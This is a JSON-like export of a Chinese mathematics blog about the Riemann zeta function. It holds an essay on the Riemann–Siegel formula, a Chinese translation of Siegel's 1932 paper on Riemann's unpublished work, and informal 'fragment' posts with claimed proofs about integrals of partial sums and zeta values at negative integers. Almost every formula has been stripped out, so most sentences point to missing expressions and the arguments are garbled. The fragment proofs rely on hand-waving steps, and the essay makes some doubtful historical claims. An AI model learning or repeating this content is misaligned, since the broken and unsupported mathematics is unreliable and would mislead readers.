周期性关系： 函数方程： 联立这两个方程并求解积分常数，得到 的闭合形式： 这一结果对所有复数 成立，揭示了 作为亚纯函数的本质，其极点恰好对应分母的零点 ，即 为整数时。 函数的积分表示与解析延拓黎曼的天才之处在于将 与 函数联系起来。考虑 的经典积分表示（对 成立）： 通过围道积分和变量替换，黎曼将其延拓至全平面，并得到关键公式： 其中 是绕负虚轴的围道。这个表示的革命性在于，它将 分解为两部分：有限项求和 与一个复杂积分。当 时，积分项的渐近行为成为主导，而黎曼正是通过 函数系统地计算了这一渐近展开。 黎曼 - 西格尔公式的陈述黎曼 - 西格尔公式针对临界线 （ ）给出 的近似表达式。定义 Riemann-Siegel theta 函数： Tips 现代标准定义 通过伽马函数的反射公式和倍乘公式，θ 函数还可表示为其他等价形式，例如： 其渐近展开为： Tips 渐近展开式当 时，黎曼西格尔 θ 函数的渐近展开式包含多项式项与指数衰减项，具体形式为： 其中： 多项式主项： 描述了函数的整体增长趋势，反映了伽马函数幅角的主导行为； 伯努利数修正项： 通过伯努利数 （如 、 ）对主项进行修正，体现了伽马函数渐近展开的高阶贡献； 指数衰减项： 可进一步展开为无穷级数 ，其衰减速度极快（例如 在 时约为 ），因此在数值计算中通常只需保留前几项。 则黎曼 - 西格尔积分公式表述为： 其中 为实值函数（Hardy 函数）， 为误差项。公式的本质是将 的求和截断于 处，并通过函数方程的对称性补偿尾部。 核心推导：鞍点法与渐近展开黎曼 - 西格尔公式的严格推导依赖复分析中的鞍点法（method of steepest descent），其核心思想是寻找积分路径上被积函数模值最大的点（鞍点），并在此点附近作泰勒展开。对 的积分表示，黎曼发现鞍点位于 ，其中 是与 相关的整数参数。 临界线情形的简化当限制 于临界线上时，公式得到显著简化。西格尔证明，此时 可表示为两个快速收敛级数的和： 其中： 是由 函数诱导的相位因子 是最优截断参数 是余项，包含 函数的高阶导数项 这一公式的精妙之处在于 的选择，黎曼发现当 时，两个级数的收敛速度最快，这一现象被后人称为 \"黎曼对称\"，也是近似函数方程的雏形。 余项估计与渐近级数西格尔的关键突破是给出余项 的严格估计。通过对积分路径分段分析，他证明： 更精确地，黎曼手稿中给出的展开式包含 函数的各阶导数： 其中 ， 是修正项，系数 可通过递推关系计算。这种带导数项的渐近展开，使得黎曼 - 西格尔公式在数值计算中表现出惊人效率，仅需计算前几项即可达到极高精度。 数学意义与应用黎曼 - 西格尔公式的影响远超数值计算本身，它为解析数论提供了全新视角： 临界线零点的分布研究通过将 表示为振荡级数，黎曼 - 西格尔公式揭示了其零点与三角级数零点之间的关联。西格尔在论文中指出，黎曼可能通过这一展开推测 \"临界线上存在无限多个零点\"，这一猜想后来被哈代于 1914 年证明。现代计算已验证前 个非平凡零点均位于临界线上，其算法基础正是黎曼 - 西格尔公式的数值实现。 函数方程的深化理解公式推导过程中自然导出 函数的函数方程： 这一方程将 与 联系起来，暗示了零点关于临界线 的对称性。黎曼 - 西格尔公式通过显式展开验证了这一对称性，当 沿临界线移动时，公式中的两个级数项呈现镜像关系。 计算复杂性的突破在计算机时代之前，黎曼 - 西格尔公式是计算 函数值的唯一高效方法。即便是今天，它仍是数值算法的核心，与直接求和 需 项不同，黎曼 - 西格尔公式仅需 项即可达到同等精度。这种平方根级别的复杂度降低，使得大规模零点计算成为可能。 结语：未完成的交响曲黎曼 - 西格尔公式的故事，是数学史上 \"未完成\" 与 \"再发现\" 的典范。黎曼凭借超越时代的直觉勾勒出框架，西格尔以严谨填补细节，而后续数学家又不断拓展其应用边界。 然而，这一公式仍留下深刻谜题：黎曼是如何发现积分 的关键性质？他声称 \" 可借助新展开式证明临界线上零点密度渐近等于 \"，但手稿中未发现完整证明。这些悬而未决的问题，恰如黎曼猜想本身，继续挑战着 21 世纪的数学家，或许，下一个西格尔正在某个图书馆的故纸堆中，等待着与黎曼跨越时空的对话。 黎曼 - 西格尔公式的真正魔力在于，它不仅是计算工具，更是思想路标，它提示我们，在解析数论的核心地带，仍存在着未被探索的数学风景，而黎曼遗留的手稿，可能还藏着更多解开谜团的钥匙。"},{"title":"","date":"2025-09-18T12:15:00.000Z","updated":"2025-09-18T12:42:00.000Z","comments":true,"path":"notes/Zeta/64.html","permalink":"https://blog.mhuig.top/notes/Zeta/64","excerpt":"","text":"On Riemann’s Nachlass for Analytic Number Theory Siegel(1932) On Riemann’s Nachlass for Analytic Number Theory Siegel(1932)"},{"title":"","date":"2025-10-18T13:20:00.000Z","updated":"2025-10-18T13:55:00.000Z","comments":true,"path":"notes/Zeta/65.html","permalink":"https://blog.mhuig.top/notes/Zeta/65","excerpt":"","text":"论黎曼解析数论遗稿 西格尔 (1932)[中文] 论黎曼解析数论遗稿 西格尔 (1932)[中文] 论黎曼解析数论遗稿卡尔・路德维希・西格尔（1932 年） 在 1859 年写给魏尔斯特拉斯的一封信中，黎曼提到了一种对 函数的新发展，但他尚未将其简化到足以包含在他发表的关于素数理论的论文中。如今，由于黎曼信中的这一点已被 H. 韦伯在其 1876 年版的黎曼著作中发表，人们可以推测，对位于哥廷根大学图书馆的黎曼遗稿进行详细审查，可能会揭示出解析数论中重要的隐藏公式。 事实上，图书馆员 Herr Distel 早在几十年前就在黎曼的论文中发现了所讨论的 函数的表示。它涉及一个渐近展开式，描述了函数 在临界线 上，更一般地，在每个带状区域 中，随着 的无限增大而表现出的行为。这个展开式的主要项后来被哈代和利特尔伍德在 1920 年独立于黎曼重新发现，作为他们 “近似函数方程” 的一个结果；他们使用了与黎曼相同的证明方法，即通过鞍点法对积分进行近似计算。然而，在黎曼那里还有一个获得渐近级数额外项的过程，这个过程基于积分 的优美性质，顺便提一下，这个积分也使得克罗内克和最近的莫德尔得出了高斯和互反公式的最优雅推导。 1926 年，贝塞尔 - 哈根在对黎曼论文的新审查中注意到了另一个以前未知的 函数的定积分表示；在这个表示中，黎曼也是基于 的性质。 这两个 的表示可以被视为黎曼数论遗稿中最重要的结果之一，因为它们并未出现在他的已发表论文中。关于所谓的 “黎曼猜想” 的证明，甚至关于 函数在临界线上存在无限多个零点的证明，并未包含在黎曼的论文中。关于在区间 内存在渐近 个 实零点的猜想，黎曼可能是基于对渐近级数的启发式考虑；但即使在今天，如何证明或反驳这一主张仍然不清楚。借助渐近级数，黎曼还计算了一些 的实零点，得到了更好的近似。 在黎曼关于 函数理论的笔记中，没有直接可发表的材料；有时在同一页面上会发现不连贯的公式；通常只写下一个等式的一边；甚至在关键点上也没有残差估计和收敛性研究。这些原因使得对黎曼片段进行自由改编成为必要，如下所述。 关于黎曼通过 “高度概括” 的想法而不是需要分析的形式工具来发现其数学工作结果的传说，可能不再像在克莱因生前那样普遍。黎曼的分析技术有多强，特别是通过他对 函数的渐近级数的推导和操作而变得特别清楚。 § 1. 定积分的计算设 为复变量。构造积分 从 到 ，沿着一条平行于第四和第二象限平分线的线，从右下到左上，穿过实轴在 和 之间的点。在公式 中，这个积分路径用积分号下方的符号 表示。 函数 是整函数。根据黎曼，它可以用指数函数以简单的方式表示。为了证明这一点，使用柯西定理得到 的两个差分方程： 一方面，我们有 所以 另一方面，当积分路径用符号 表示时，这是通过向量 的平行移动从先前使用的路径得到的，我们有 因为被积函数在极点 x = 0 处有留数 ；所以因为 方程 得出公式 从 和 首先得到 时的著名方程 然后通过消去 得到所需结果 对 求 次导数，得到一般公式 为了方便起见，将 改写为另一种形式。将 代替 ，并将 乘以 ；这给出了黎曼发现的方程 这将继续发挥重要作用。 积分 是积分 的一个特例，对于这个积分，两个差分方程也足够了。对于 的每个负有理值，都有一个类似于 的公式；通过 u 的特化，可以得到高斯和的互反律。在他的讲座中，黎曼基于 的性质建立了 函数的变换理论。 § 2. ζ 函数的渐近公式如果复变量 的实部 大于 ，且 为自然数，则 或者当 要沿着负虚轴的正方向绕行时， 这个公式甚至对于任意值的 都成立。现在让 限制在一个固定区间 ，并且让 。为了通过鞍点法对 中出现的积分进行渐近计算，当 时，必须取通过 的零点的积分路径。从这个方程 得到零点的值 在以 为中心、半径为 的圆盘内，以下展开式成立 并且在级数 中有一个可能的 中积分的渐近展开式。如果 取特殊值 ，则级数中出现的积分现在都可以通过 §1 的公式 来计算。对于固定的 ，这是对 的一个条件，通常只能近似满足，因为 是一个整数。这就是为什么黎曼用邻近的值 替换了鞍点 ，这个值从方程 得到 然后根据 确定 为小于 的最大整数，所以 现在引入缩写 现在假设 不是整数。积分路径 将被由两条从点 发出的半直线组成的折线 替换，分别包含点 和 。关于极点 ，留数定理得出 在 的左侧两个直线元素中，我们称之为 ，现在 因此根据 和 对于 在 上一致。 在 的右半线上，设 那么我们有 即使 ，这也成立，因此对于足够大的 所以我们有估计 并且这对于 在 上一致。从 和 得到 对于 右边积分的渐近展开，从恒等式开始 对于 ，右边的最后一个因子可以展开为 的幂级数，其系数需要进一步研究。根据 中定义的 ，设 从微分方程 得到递推公式 对于 也成立，当设 时。如果加上方程 ，那么 由 确定；特别是， 是 的 次多项式，不包含 的幂，对于 。因此 对于 一致成立，但在 上稍微不一致。 为了估计幂级数 的尾部，使用表示 其中 是位于收敛圆内的曲线，正绕 和 各一次。由 我们有 因此在圆 内，我们有估计 在 中设 ，并让 是围绕 的半径为 的圆，目前仅受条件 的限制。那么从 、 、 一致地在 和 上得到估计 函数 关于 的最小值为 ，当 时。因此，如果 则选择 是允许的。因此，我们有 对于 ，根据 ，选择 也是允许的；那么 得出关系 由 和 得出 为了确定如果在这个方程中将 替换为部分和 所产生的误差，必须检查积分 从现在开始，设 。如果将积分路径中位于圆盘 或 内的部分分别替换为相应的弧，则可以避免被积函数在极点 附近的邻域。如 中所示，对圆弧的积分仅对 贡献 。在积分路径的其余部分，有 。设 并考虑 对于 ，或者另一方面 对于 ；那么 一个简单的计算表明，对于 ，第二项 超过了第一项。这给出了估计 在 和 上一致。 从 、 、 、 、 现在得出 在右边积分时，不是从 到 ，而是从 到 的整条线，那么，由于 [英译者注： ] 的值仅变化 ；另一方面，根据 所以 最后，将积分变量 替换为 ，使得 根据 §1 的结果，积分 的值为 为了也以初等方式表达 中出现的右侧积分，对于 ，黎曼从 形成方程 从中通过展开 的幂级数，得到公式 现在，从 、 、 得出展开式 其中 并且其中系数 由递推公式 确定。这个展开是渐近的，并且特别是对于 是一致的，因为 中的余项确实对于每个固定的 ，是关于 的 阶，在 上一致。从分析中已知的渐近级数来看， 本身与出现整数 的不同之处在于，这使得展开的各个项依赖于 的不连续性。在证明中所做的假设 不是整数，可以很容易地随后消除，因为可以在 中在 的任何整数值处进行右边界跨越。 如果我们在 中选择特殊值 ，误差项是 ，因此随着 t 的增加呈指数级趋于 。对于实际目的，由于小指数因子 ，这个误差项的估计并不有用；更精细的估计表明 可以被一个相当大的数字替代。找到误差作为 的函数的确切增长顺序将是有趣的；但这并不简单，因为它对于固定的 并不随着 的增加而趋于 。 由于 的情况特别重要，因此将 乘以由 定义的函数 是适宜的，其中我们指的是 在从 到 和从 到 的平面切割中唯一确定的那些值，这些值在 时为零。那么，在临界线 上， ，并且 是实数。根据 ，对于 其中 由 定义。包含在 中的每个有限和中的 是 的多项式。因此，根据 ，对于每个固定的 和 ，通过按 的幂重新排序，我们有关系 其中系数 是有限数量的导数 的齐次线性组合。使用 和 的递推公式显式计算 相当繁琐；黎曼通过以下技巧简化了这一点。代入 然后 是一个完整的渐近级数，并且所需的量 是 的系数，该系数通过按 的幂排序级数而产生。右边 的和只不过是通过形式上乘以收敛的幂级数 与发散的幂级数 由于固定的幂 仅出现在有限数量的系数 中，因此以下计算 的方法是合法的：通过形式上乘以 和 构造项 由此，通过按 的幂次排序，得到级数 ；此时 即为 中的常数项。在计算该常数项时， 中出现的 的负幂次无关紧要，因此只需确定 的多项式部分。 为简洁起见，设 则根据 式有 其中 ，因此幂级数 形式上满足微分方程 由此可得关于级数 的微分方程 若现在按 的幂次排序， 则由 式可得 以及递推公式 若设 则有 利用这些递推公式计算 后，即可显式给出 ，即 从而得到 其中 取值 ， 取值 。 当 时，递推公式 最为简便。对于这一特殊情况，容易得到 其中省略的项仅包含 的负幂次。因此，对于 有 从而在 的情况下， 被确定到 量级的误差。 若借助斯特林级数对右侧第二项中的 进行渐近展开，渐近展开式 可进一步简化。为此，黎曼考虑了以下公式 该式通过对 的已知伯努利积分表示进行简单变换得到。由于恒等式 通过分离实部和虚部可得 其中由于在 处存在极点，积分应理解为柯西主值。若设 则有 ，且一般有 由此以众所周知的方式得到渐近级数 当 时，有 ，因此 结合 式，我们最终得到 时 的渐近级数的确定形式： 其中 这本质上与黎曼的结论一致，唯一的新贡献是余项估计。 现在可以放宽 的条件和 仅限于区间 的限制，仍然可以使用渐近展开式 ；此时只需将 理解为复数 ， 理解为整数 ，而 的定义仍由 给出。证明这一论断所需的扩展可以从 的推导中轻松获得。 渐近级数 是 的齐次线性组合；通过重新排列，可以得到形如 的表达式，其中每个 都是 的幂级数。这些幂级数是发散的；这引发了一个问题：它们是否是某些解析函数 的渐近展开式？以及级数 是否也是 的渐近展开式？黎曼也曾研究过这个问题；但同样没有必要的余项估计。由于级数 因具有更大的余项而不具备原始渐近展开式的理论和实际重要性，在下文中将省略对其误差的繁琐研究；或许这种 [表述？] 更能体现黎曼的形式幂级数的特点。 公式 （也可写成 的形式）允许进行逆变换 当 时成立。这可以通过应用傅里叶定理或对 中的变量取复共轭得到。由 可得 该式对 也成立。可直接将 替换为级数 并利用 中的积分 计算该级数中单个成员的贡献。 通过这种方式，我们得到渐近展开式 另一方面，根据 和 有 由于可以容易看出，如 中给出的 作为 的齐次线性函数（具常系数）的表示方式是唯一的，因此由 和 可得方程 特别地，若设 则有 对于其余的 ，可以通过 的部分积分推导出递推关系；但也可以不经过额外计算，以下述方式获得。根据 、 、 有 其中根据 和 ， 满足递推关系 由于 因此对于 有递推公式 其中 。由此利用 可得 根据 式，可以得到 本身的渐近展开式；具体而言 将此代入上述 的结果中，可得 从递推关系 可知， 的渐近级数中出现的所有幂指数均满足 。因此， 中出现的 的所有导数的阶数均为 的形式，这一点在 的表达式中易于验证。若设 其中求和指标 取值 ，求和指标 取值 ，则所有 的值均可确定；根据 ， 的值已知；可以立即看出， 和 中共同出现的 的值是一致的。 为了数值计算 以及渐近级数的实际应用，按 的递增幂次排序更为可取。通过 确定 实际上比之前处理的 的确定更为繁琐；此外，连续的 并不具有单调递减的幅度，但 确实具有精确的阶数 ，因此例如只需将 到 计算到之前的误差 即可。 通过公式 过渡到 。如果试图从 获得 的精确表达式而非仅仅一个渐近级数，那么将会引出下一节将要讨论的方法。 § 3. ζ 函数的积分表示基于第 1 节公式 对 函数渐近级数系数的显式确定，黎曼还推导出了一个相当有趣的 函数表达式 —— 该表达式直到 1926 年才被其他数学家注意到。 现设 ，并令 在从 到 的割线上取主值。将公式 乘以 并从 到 沿第一象限平分线积分。现设缩写 ，则有 以及 因此根据公式 有 此处第二个积分可表示为 其中符号 表示通过实轴反射得到的第一条积分路径。将 乘以因子 并考虑关系式 可得在整个 平面上成立的公式 黎曼并未将所有内容都写成这种对称形式；但这里选择的版本似乎更便于应用。现已使 的函数方程显现出来；因为当 时，右侧两项互为复共轭，因此 在此处为实数，且由于该函数在 时为实数，根据对称性原理，函数方程 适用于 ，从而普遍适用于任意 。 若进一步设 则根据 和 有 由此将 在临界线上的研究简化为对 实部的研究。 § 4. 两个黎曼公式对 ζ 函数理论的意义基于方程 的 渐近级数的主要项是表达式 该式也曾由哈代和利特尔伍德发现，但他们仅给出了其绝对值的上界，而非黎曼对 的展开式。他们还发现了一个更一般的主要项形式，即 其中 。该式此前并未由黎曼给出；但可以想象，沿着黎曼的思路，不难得到表达式 的完整渐近展开式 —— 该展开式对于由 定义的函数 所起的作用，与黎曼的特殊函数 相同。 对于哈代和利特尔伍德所应用的估计 在区间 内零点个数 的应用（黎曼公式对此给出了更精确的值），似乎并非更好的结果。然而在上述文献中，黎曼声称 渐近等于 ，因而渐近等于 在带状区域 内所有零点 的个数，并声称可借助他的新展开式证明这一点；但从其遗稿中尚不清楚他是否已设计出该证明。在 时成立的表示式 其中 右侧三角级数的第一项（即 ）在区间 内实际上渐近具有 个零点；且系数 单调递减。或许黎曼认为这一观察可用于其断言的证明。 显然可以利用精确的黎曼公式来估计平均值 这些平均值是众所周知的，并与所谓的林德勒夫猜想密切相关。但在此会遇到来自自然数分解的显著算术困难。 对于 函数的数值表编制（尤其是进一步计算零点），渐近展开式具有重要价值。然而若要将其用于实际应用，则需要比第 2 节中推导的更精细的余项估计。黎曼曾运用其公式进行了大量计算以确定 的正零点。对于最小正零点，他得到的值为 ；格拉姆计算的值为 ，相差不足千分之三。利用 的乘积表示也可得到 的下界，从而得出易证的等式 其中 为欧拉常数，且 遍历所有位于右半平面的 的解。由此黎曼断言 对于 ，他得到的值为 ；而格拉姆给出的值为 。 第二个黎曼公式（即 的积分表示）或许对理论更具意义。人们将尝试从 中获得关于 在临界线上零点分布的信息。设 在区间 内增加。在此过程中， 增加 ，其中当经过位于 上的 可能零点时，变化量等于该零点重数乘以 ，因此根据 ， 在 内的零点个数大于 。但现在我们有 因此根据 ， 在区间 内的零点个数渐近至少等于 ，即渐近等于 ζ(s) 在带状区域 内的零点个数 —— 若函数 （由 定义）的幅角随 减小得比 慢。对于每个半带状区域 ，可通过第 2 节的方法将 展开为渐近级数；但再次得到的主要项是 个求和项的和，即 ；而研究该求和项幅角的问题与研究 中出现求和项零点的问题难度完全相同，因此引入 似乎并未带来任何收益。 若现考虑边为 的矩形（其上边不含 的零点），则 在矩形正方向环流时的变化量等于矩形内 的零点个数。在下边 变化量为 ，在右边（遵循渐近级数）也仅为 。此外，通过 函数理论中的常规方法可证明，上边的变化量至多为 。因此，除 量级的误差外， 在区间 内的变化量等于 乘以矩形内 的零点个数。由此问题简化为研究整超越函数 的零点。 黎曼试图获得关于 零点的陈述，为此他从 形成关系式 并通过引入新变量、变形积分区域及应用留数定理，将该复二重积分转化为不同形式；但未得到有用结果。 迄今为止关于 零点位置知之甚少。黎曼未对此作进一步评论；因此在本文的历史数学论述中，关于 理论的以下评论必须简短。它们提供了不等式 的证明。对于 ，可通过第 2 节的方法获得渐近级数；就目前目的而言，仅需考虑该级数的主要项。首先将证明：在 的区域中，适用以下公式 其中缩写 被使用。 现根据 有 函数 的鞍点位于 。设 对于每个自然数 ，根据柯西定理有 现很想完全按照第 2 节的方法进行，因此会选择 ；但这样仅在较小矩形区域 内直接得到 ，而扩展到附加区域 需要消除某些附加项。这就是为何我们最初让 k 任意选取。 右侧第一个积分可根据黎曼第 1 节的方法计算；得到 在第二个积分中，我们将积分路径引导通过鞍点 ，并平行于第二和第四象限平分线行进。因此它会在实轴上的点 处穿过。然而为避免接近极点 和 的邻域，仍可用这些圆上的弧段替换积分路径位于圆 和 内的部分。若假设 则有 对于 需要两个估计。第一个针对圆 ；具体为 因此 第二个针对积分路径位于该圆外的部分。若设 ，则在积分路径上 ，且在 时，在圆 外适用不等式 因此 且 其中 当 。但此时 且 此外，在积分路径上 因此 由此可得 并与 、 、 、 联立得 现需证明：对于 且在区域 内，通过适当选择 ，项 的阶数高于大括号内其他项。首先， 当 且 因此 同时 对于子区域 ，不等式 成立，且右侧随 趋于无穷大。因此在 和 的基础上可知：当 时， 式大括号内的表达式在上述子区域内取值为 在子区域 （待处理）中，现取 则对于充分大的 有 因此根据 和 有 此外，对于 有 因此对于充分大的 ， 位于圆 内，且 式适用于 ；由于 可得 最后，对于 有 且对于充分大的 有 因此根据 和 有 综合不等式 可知估计 、 、 表明：即使在区域 内， 式大括号内的值仍由表达式 给出。 因此通过应用斯特林公式， 式的断言得证。 顺带指出， 式甚至可在更大区域 （其中 为任意固定正数）内得到证明；但对于以下目的，每个 值小于 （即 ）即可。 除了公式 之外，还需要获得 在固定 且 时的阶数粗略估计。这可以从第 2 节中 的渐近展开式方法获得；出于当前目的，仅需考虑该展开式的主要项。首先将证明：在区域 内，适用以下公式 其中 ， 在象限平面 内有效。通过类似第 2 节的方法可获得渐近展开式的其他项，但对于当前目的并不需要。 通过比较 和 可得：对于象限平面 ， 的渐近展开式；该推导可能比第 2 节的方法在必要估计方面稍简单，但级数中的各个项最初以更复杂的形式出现。 … … 根据 可得 根据 可得 为方便起见，引入函数 根据 可得：对于 且 时 现在应能够估计 在每条半线 上的平均值，具体为表达式 但通过 可以更优雅地实现这一目标：具体而言，对于 有 此处可通过变形积分路径、交换积分顺序以及应用留数定理来转换右侧。计算可得以下结论： 该结论在 且 时成立，并由此进一步可得 因此对于每个固定的 有 但根据斯特林公式还可得到以下结论： 由此可得所需公式 对于固定的 。由此进一步可得 对于 ，可得 的下界。实际上，根据 ，在临界线上 因此根据 有 最后，对于 ，根据 和 有 现在，设 ，且直线 和 上函数 无零点。此外，设 。考虑边为 的矩形。在左边 上，对于足够大的 ，根据 没有 的零点。通过平行于实轴的切割将矩形内 的零点与右边 连接起来。在切割后的矩形内， 是单值的（明确的）；通过要求固定 ，它成为该函数的一个分支。众所周知，此时适用 其中 遍历位于矩形内的所有根的实部。第一个积分可以在 时向上准确估计，在 时向下估计，在 时估计。第三和第四积分的贡献，如通过 和 不难看出，仅为 阶。最后，第二个积分可以通过使用 和 以通常方式估计为 。因此，根据 有 根据 有 以及根据 有 在最后一个等式中， 遍历位于条带内的所有零点的实部。如果这些零点的数量记为 ，则根据 (94) 有 在上半平面， 的零点与 的零点一致。在假设位于上方 个零点中，最多有 个零点的前提下， 在区间 内的变化等于 ，因此无法获得关于 零点的陈述。然而，首先根据 可知 因此肯定存在无限多个位于左侧的零点；并且这可以从 和 中独立于 得出，通过减去位于区域 内零点数量的下界。我们将这个数量记为 ，因此对于每个 有 这个估计在 时最为有利，并得出 。目前 已知，通过采用类似于 的形式，用 代替 ， 其中 遍历位于条带内且位于临界线右侧的函数零点的实部。因此可得 在临界线右侧，的零点数量最多为 ，因此在区间内的减少量最多为 。因此，在该区间内的增加量至少为 ，其中 为任意增长慢于 的正函数。因此， 在该区间内的增加量至少为 ，根据 、 、 ，该值至少等于 。因此， 在区间 内的零点数 满足不等式 因此，位于临界线上的 零点的密度，即 的比值下限，对于 是正的，并且至少等于 ，因此大于 。除了这个数值之外，该结论并非新结果，但已在 1920 年由哈代和利特尔伍德以更简单的方式证明。尽管如此，这一小结果可能对这里讨论的 性质具有一定的独立价值。 关于公式 可以作进一步说明。黎曼猜想的错误程度，在某种意义上，可以通过总和 来衡量。尽管通过利特尔伍德已知该总和不超过 ，但目前尚无更好的估计。如果黎曼猜想是错误的，这个总和可能会比 增长得更快；然而，根据 ，在这种情况下 的增长速度将超过 ，因此黎曼猜想不可能 “过于错误”。设 为任意正函数，其增长速度比 慢，则根据 仍然可得：在狭窄区域 内，至少存在 个 的零点。这是一个新的结果，即使对于 增长速度比 慢的情况也成立。例如，在区域 内，存在超过 个零点。 关于是否可以改进 中给出的 下界的问题仍然悬而未决。为了证明黎曼关于 渐近等于 的断言，只需证明关于 的相应结论。这似乎难以通过之前使用的 函数分析方法实现，除非有本质上新的思路；尤其是任何试图证明黎曼猜想的尝试。"},{"title":"","date":"2025-10-20T04:20:00.000Z","updated":"2025-10-20T11:31:00.000Z","comments":true,"path":"notes/Zeta/66.html","permalink":"https://blog.mhuig.top/notes/Zeta/66","excerpt":"","text":"不知名的碎片 4 不知名的碎片 4 证明 （其中 是对部分和的 变换） 为正整数 变换 的定义: 设 是定义在正整数集上的函数，若存在一个解析表达式 （如多项式、指数函数等）使得对所有 成立，则变换 将 映射为定义在 上的函数 ，满足： 其中 ，即通过将原表达式中的离散变量 直接替换为连续变量 ，实现定义域从 到 的扩展。 部分和 表达式 部分和 零点 积分 计算 理论值（伯努利数关系） 1 2 3 4 5 证明要证明对正整数 , （其中 为部分和， 为黎曼 函数），关键在于利用 幂和公式的伯努利数表示 与 黎曼 函数在负整数点的解析延拓结果 。以下是严格证明过程： 步骤 1：明确被积函数的表达式对正整数 , ，即前 个正整数的 次幂和，记为 。 步骤 2：幂和的伯努利数表示根据 Faulhaber 公式 （幂和的多项式展开），对非负整数 , 可表示为： 其中 是 伯努利数 （约定 , , 且对奇数 , ） 。 步骤 3：对幂和公式积分需计算定积分 。将幂和公式代入： 计算积分项 对 , 积分结果为： 代回 , 得： 步骤 4：化简求和式将积分结果代入原式： 关键观察：伯努利数的特殊性当 时， 是唯一非零的关键项（因对 ，原幂和公式中无此项，且对奇数 ， ） 。 通过指标替换与二项式系数化简，求和式中 仅保留 对应的项 （其他项因伯努利数为零或积分结果抵消而消失），最终化简为： 步骤 5：联系黎曼 函数在负整数点的值黎曼 函数通过解析延拓后，在负整数点 （ 为正整数）的值为： （此为黎曼 函数的经典结果，可由函数方程或伯努利数生成函数推导） 。 结论对比步骤 4 与步骤 5 的结果，得： 证毕 。 因此，对任意正整数 , 特别地， 时也成立。 维特根斯坦：\"对于不可言说之物，我们必须保持沉默\" 玄学 下面这段只可意会不可言传。我发现无论我怎么表述都是片面的，词穷了。表格中被积函数 的零点（如 ）仅影响多项式局部性质，但积分结果最终由伯努利数的非零项主导。黎曼 函数的非平凡零点位于临界线 ，与实轴上的积分路径无交集。这里引入的积分运算实现了局部的解析延拓。这一现象本质是解析延拓的必然结果：幂和多项式的积分恰好抵消发散项，留下与伯努利数相关的有限值，而这正是 函数在负整数点的定义。解析延拓的核心魅力在于：复平面上局部定义的解析函数，能通过唯一性「自动补全」至更大区域，仿佛函数本身早已蕴含全局信息。这种神奇现象源于复变函数的两个关键特性：无限可微性与内部唯一性。解析延拓展现了「局部决定全局」的深刻思想。从局部到整体的逻辑链条。解析延拓的边界由奇点决定：若收敛圆边界「布满奇点」（如 的自然边界 ），则延拓无法突破。函数的奇点结构才是其本质特征，而延拓不过是对这种内在结构的逐步揭露。我们再次回到黎曼的论文，欣赏黎曼的直觉：从到围道积分其中积分路线 沿一条闭路径按正方向从 到 ，这条路径内部包含 点但不包含被积函数的其他不连续的奇点;再到利用傅立叶定理积分路径是复平面上的竖直线 （ ）， 的选择需确保路径不经过 的奇点（如 或 的零点），延拓后需 （ 为 非平凡零点）。黎曼在论文中所展示的，这一公式的魔力在于：局部复积分的计算，竟能导出全局素数分布的精确规律。 下面我们尝试使用抽象函数递推关系将上述结论进行再次证明。 等价命题设函数列 满足递推关系 ， （ ），则令 ,对任意正整数 ，有： 其中 为黎曼 函数，定义域为全体复数 （通过解析延拓定义）。 证明步骤1. 函数列的显式表示与延拓由递推关系直接可得 ，即黎曼 函数的部分和。利用 Hurwitz 函数 （ ），可将其延拓为： 这一表达式对所有复数 成立（通过解析延拓），且当 时， （ ），故 。 2. 积分转化与交换次序需计算积分 ，其中 为正整数（即 ）。代入 （因 ），得： 由于被积函数关于 为常数（仅依赖于 ），积分结果为： 关键转折 ：当 时，需证明 。但直接求和 发散，故需通过黎曼 函数的解析延拓处理。 3. 利用 函数的负整数取值公式黎曼 函数在负整数处的取值可由解析延拓或 Hurwitz 函数性质确定。已知对正整数 ，有： 其中 为伯努利数（如 ， 等）。 另一方面，自然数幂和 可由伯努利多项式表示为： 当 时，含 的项趋于无穷，但通过黎曼 函数的解析延拓，发散部分被精确抵消，最终极限为 。 4. 积分与极限交换的合理性需验证 。 对固定 ， 为多项式函数，关于 一致收敛到其解析延拓后的极限 ； 积分区间 有界，故可交换极限与积分次序，得： 定义域说明黎曼 函数：通过解析延拓定义于全体复数 ，负整数处取值为有理数（伯努利数的函数）； 积分收敛性：对任意正整数 ，被积函数 为多项式，积分在有限区间 内恒收敛，极限通过解析延拓唯一确定。 结论通过函数列的递推关系、 Hurwitz 函数的延拓性质及黎曼 函数的负整数取值公式，严格证明了函数列 满足递推关系 ， （ ），则对任意正整数 ，有： 又一个证明要证明 需通过积分变换与解析延拓建立函数列 与黎曼 函数的联系。核心思路是对递推式积分后取极限，结合 函数的积分表示完成证明。 第一步：递推关系设函数列 满足递推关系： 其中 为连续变量， 为参数。对等式两端从 到 积分： 第二步：变量替换与积分拆分右侧第一个积分：令 ，则 拆分为 记常数项 。 右侧第二个积分：当 时， 第三步：整理递推式并取极限将上述结果代入得： 两边同时减去 ，再同时乘 ，整理一下，得到： 这样等号左边变为 的函数，右边变为 的函数 由于 得到： 然后对上式求对 的一阶导，得到： 等号右边的式子在 n 趋于正无穷的时候等于 0，那么就得到： 第四步：联系黎曼 ζ 函数的积分表示由定义， ，即 函数的部分和。当 时，若 ， 。结合上述极限结果： 对解析延拓后成立 第五步：代入 完成证明对正整数 ，取 （满足 ），则： 即原命题 成立。"},{"title":"","date":"2025-10-20T06:20:00.000Z","updated":"2025-10-20T06:31:00.000Z","comments":true,"path":"notes/Zeta/67.html","permalink":"https://blog.mhuig.top/notes/Zeta/67","excerpt":"","text":"不知名的碎片 5 不知名的碎片 5 证明 其中 是对部分和的导数的 变换， 为正整数 变换 的定义: 设 是定义在正整数集上的函数，若存在一个解析表达式 （如多项式、指数函数等）使得对所有 成立，则变换 将 映射为定义在 上的函数 ，满足： 其中 ，即通过将原表达式中的离散变量 直接替换为连续变量 ，实现定义域从 到 的扩展。 部分和 表达式 积分 计算过程 理论值 1 2 3 4 5 要证明 （其中 为正整数） ，需通过伯努利多项式的解析延拓、 函数导数的经典关系及积分换元法： 1. 明确 的表达式与解析延拓黎曼 函数部分和的导数为 黎曼 函数部分和定义为 对 求导得: 代入 （ 为正整数, 此时 ）, 直接得到: 核心问题 ：当 为非整数时, 和式 无意义, 需通过解析延拓将其拓展为定义在全体实数（甚至复数）上的函数. 自然数幂和的伯努利多项式表示（基础公式） 先回顾自然数幂和的经典结果 ：对正整数 , 前 个自然数的 次幂之和可表示为伯努利多项式 的形式: 其中: 是伯努利多项式（最高次项为 的多项式）； 是伯努利数（伯努利多项式在 处的取值, 如 , , , ）。 它将离散幂和转化为连续多项式, 为后续解析延拓提供可能. 对幂和公式求导, 引入 项 为得到含 的和式, 